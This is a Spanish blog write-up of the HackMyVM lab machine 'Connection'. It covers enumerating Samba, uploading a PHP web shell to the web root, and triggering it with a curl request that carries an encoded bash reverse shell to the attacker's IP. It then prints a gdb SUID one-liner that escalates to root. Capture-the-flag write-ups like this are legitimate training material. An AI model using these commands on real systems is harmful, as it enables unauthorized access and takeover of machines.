---
layout: single
title: Connection - HackMyVM
excerpt: "Connection es una máquina Linux creada por whitecr0wz, en esta máquina veremos la subida de un archivo php malicioso por el servicio samba, podremos ejecutar comandos
 remotamente y obtener una shell. Conseguiremos la escalada de privilegios usando un binario con permisos SUID."
date: 2021-09-22
classes: wide
header:
  teaser: /assets/images/hmvm-Connection/hmvmConnection.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - fácil
tags:
  - hackmyvm
  - smbmap
  - smbclient
  - suid
  - whitecr0wz
---

### Escaneo de puertos
```bash
❯ nmap -p- --open -T5 -v -n 192.168.1.55

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### Escaneo de servicios
```bash
❯ nmap -sCV -p 22,80,139,445 192.168.1.55

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m02s, deviation: 2h18m33s, median: 2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-22T14:12:26
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2021-09-22T10:12:26-04:00
```

### Smbmap (puerto 445)

```bash
❯ smbmap -H 192.168.1.55

[+] IP: 192.168.1.55:445	Name: 192.168.1.55                                      
        Disk                                                Permissions	Comment
	    ----                                                  -----------	    -------
	   share                                             	READ ONLY	
	   print$                                            	NO ACCESS	Printer Drivers
	   IPC$                                              	NO ACCESS	IPC Service (Private Share for uploading files)
```

Usamos `smbclient` para conectarnos a `share`, dentro vemos un directorio llamado html.
```bash
❯ smbclient -N //192.168.1.55/share
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 23 03:48:39 2020
  ..                                  D        0  Wed Sep 23 03:48:39 2020
  html                                D        0  Wed Sep 23 04:20:00 2020

		7158264 blocks of size 1024. 5463076 blocks available
smb: \> cd html
smb: \html\> ls
  .                                   D        0  Wed Sep 23 04:20:00 2020
  ..                                  D        0  Wed Sep 23 03:48:39 2020
  index.html                          N    10701  Wed Sep 23 03:48:45 2020

		7158264 blocks of size 1024. 5463076 blocks available
smb: \html\>
```

Descargamos `index.html` y vemos que es la página por defecto de apache2

![](/assets/images/hmvm-Connection/apache2.png)

Ahora crearemos un archivo de texto para subirlo en el directorio `html` del servidor `samba`
```bash
❯ touch test.txt
❯ nano test.txt
```

Nos conectamos de nuevo a samba y nos movemos al directorio html para subir nuestro archivo.

![](/assets/images/hmvm-Connection/subidaArchivotxt.png)

Abrimos nuestro navegador y nos vamos a la siguiente dirección: `http://192.168.1.55/test.txt`

![](/assets/images/hmvm-Connection/archivotxtOk.png)

Ahora creamos un archivo php malicioso para subirlo al directorio html y comprobar si la web interpreta código php.
```bash
❯ touch shell.php
❯ nano shell.php
```
![](/assets/images/hmvm-Connection/shellphp.png)

Subimos la shell:

![](/assets/images/hmvm-Connection/subidaShell.png)

Volvemos a `http://192.168.1.55` y vemos que nos interpreta código php como usuario `www-data`

![](/assets/images/hmvm-Connection/webInterpretaphp.png)

Ponemos un netcat a la escucha para obtener una shell de la máquina objetivo.

`nc -lvnp 1234`

Usamos curl para tener la ejecución remota de comandos (RCE).

`curl -s http://192.168.1.55/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.42%2F1234%200%3E%261%22`

![](/assets/images/hmvm-Connection/shellok.png)

### TTY
Ahora hacemos un tratamiento de la tty para tener nuestra shell interactiva.
```bash
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

Con el ususario www-data podemos leer la flag del usuario.
```bash
# cat local.txt
3f49xxxxxxxxxxxxxxxxxxxxxxxx9617
```

### Privesc
Con find buscaremos todos los binarios con permisos SUID.
```bash
www-data@connection:/var/www/html$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
```

El binario `gdb`me llama la atención, usaremos el recurso gtfobins:

![](/assets/images/hmvm-Connection/gtfobins.png)

```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

Obtenemos el root.

![](/assets/images/hmvm-Connection/root.png)

Una vez como root ya podemos leer la flag de root

```bash
# cat proof.txt
a7c6xxxxxxxxxxxxxxxxxxxxxxxx4a39
```
